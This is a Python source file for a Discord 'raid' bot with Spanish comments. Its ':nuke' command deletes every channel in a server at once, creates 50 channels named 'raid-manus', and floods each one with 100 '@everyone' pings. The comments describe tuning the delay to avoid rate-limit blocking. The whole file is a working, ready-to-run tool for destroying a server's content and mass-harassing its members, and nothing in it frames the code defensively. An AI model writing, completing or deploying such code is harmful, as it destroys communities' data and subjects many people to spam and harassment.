import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv

# Cargar variables de entorno
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# Configuración del bot con todos los privilegios
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot de Raid Avanzado conectado como {bot.user.name}')
    print('Comando principal: :nuke')

async def spam_pings(channel):
    """Envía ráfagas de pings en un canal específico"""
    for _ in range(100):
        try:
            await channel.send("@everyone RAID BY MANUS BOT 🚀")
            # Delay mínimo para no ser bloqueado instantáneamente pero mantener velocidad
            await asyncio.sleep(0.1)
        except:
            break

@bot.command(name='nuke')
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    """
    Comando Ultra-Rápido: Borra todo, crea 50 canales y hace 100 pings en cada uno.
    """
    guild = ctx.guild
    print(f"Iniciando Nuke en {guild.name}")

    # 1. Borrar todos los canales existentes en paralelo
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    # 2. Crear 50 canales nuevos y empezar el spam inmediatamente en cada uno
    async def create_and_spam(i):
        try:
            channel = await guild.create_text_channel(f'raid-manus-{i+1}')
            await spam_pings(channel)
        except:
            pass

    # Lanzamos la creación de 50 canales de forma asíncrona
    create_tasks = [create_and_spam(i) for i in range(50)]
    await asyncio.gather(*create_tasks, return_exceptions=True)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Necesitas permisos de administrador.")
    else:
        print(f"Error: {error}")

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Error: Configura el DISCORD_TOKEN en el archivo .env")
